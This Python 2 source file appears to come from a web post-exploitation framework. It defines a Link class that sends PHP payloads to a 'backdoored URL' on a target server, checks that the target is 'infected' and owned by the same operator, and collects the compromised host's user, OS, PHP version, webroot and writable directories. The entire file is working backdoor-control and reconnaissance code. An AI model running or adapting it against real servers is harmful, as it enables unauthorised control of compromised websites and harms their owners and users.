import network.sender
from functions import *

class Link:
    success = False

    def __init__(self, CNF):
        self.CNF  = CNF
        self.is_first_payload = False
        self.req_err = 'Error connecting to the target'
        self.exc_err = 'The target does not semm to be infected'


    def open(self):
        self.is_first_payload = True
        return(self._link('open'))


    def check(self):
        err_tpl = 'Settings error: %s: ' % quot('TARGET')
        self.req_err = err_tpl+'Communication impossible'
        self.exc_err = err_tpl+'Needs to be a backdoored URL'

        if not self._link('open'):
            return(False)

        old_srv = self.CNF['SRV']['signature']
        new_srv = self.srv_vars['signature']
        if new_srv != old_srv:
            self._error(err_tpl+'Is not owned by the same server')
            return(False)

        return(True)


    def close(self):
        print P_inf+'Connection to %s closed.' % self.CNF['LNK']['DOMAIN']
        return(True)

    def _link(self, _type='open'):
        payload = 'framework/phpfiles/server_link/%s.php' % _type
        payload = getpath(payload).phpcode()
        return(self._send(payload))

    def _send(self, payload):
        link = network.sender.Load(self.CNF)
        link.open(payload)
        if self._error(link):
            return(False)
        self.success = True
        env = self._get_env(link.read())
        srv = self._build_vars(env)
        #srv['ENV'] = env
        self.srv_vars  = srv
        self.signature = srv['signature']
        return(True)

    def _error(self, obj):
        err = ''
        try: err = obj.error
        except: print P_err+obj
        if not err:
            return(False)
        if err == 'request':
            print P_err+self.req_err
        if err == 'execution':
            print P_err+self.exc_err
        return(True)

    def _get_env(self, env):
        result = list()
        for name, value in env.items():
            #if value and (name not in self.env_blacklist):
            value = str(value)
            value = value.strip()
            result.append((name, value))
        return dict(result)


    def _build_vars(self, env):

        def get(options, default=''):
            for choice in options:
                if choice in env:
                    if env[choice].strip():
                        return(env[choice])
            return(default)

        srv = dict()

        srv['client_addr']   = get(['REMOTE_ADDR','REMOTE_HOST'])
        if ":" in srv['client_addr']:srv['client_addr'] = "[%s]" % srv['client_addr']
        srv['host']          = get(['SERVER_NAME','HTTP_HOST'],self.CNF['LNK']['DOMAIN'])
        srv['addr']          = get(['SERVER_ADDR','LOCAL_ADDR'],srv['host'])
        if ":" in srv['addr']:srv['addr'] = "[%s]" % srv['addr']
        srv['port']          = get(['SERVER_PORT'],'80')
        srv['os']            = get(['OS','PHP_OS'],'unknow')
        srv['user']          =(get(['WHOAMI','USERNAME','USER']) or
                               get(['USERPROFILE'],'unknow').split('\\')[-1])
        srv['soft']          = get(['SERVER_SOFTWARE'],'unknow software')
        srv['phpver']        = get(['PHP_VERSION'],'?')
        srv['webroot']       = get(['WEBROOT'])
        srv['home']          = get(['HOME'],srv['webroot'])

        srv['write_webdir']  = get(['W_WEBDIR'])
        srv['write_tmpdir']  = get(['W_TMPDIR'])


        if not srv['home']:
            path = get(['SCRIPT_FILENAME',
                        'PATH_TRANSLATED'])
            sep = '\\'
            if not path:
                path = '/'
            else:
                if path[0] == '/': sep = '/'
                path = sep.join(path.split(sep)[0:-1])
            srv['home'] = path

        srv['separator'] = '\\'
        if srv['home'].startswith('/'):
            srv['separator'] = '/'

        srv['platform'] = 'nix'
        if srv['separator'] == '\\':
            srv['platform'] = 'win'

        from hashlib import md5
        sig = srv['os']+srv['phpver']+srv['platform']+srv['soft']
        srv['signature'] = md5(sig).hexdigest()

        return(srv)
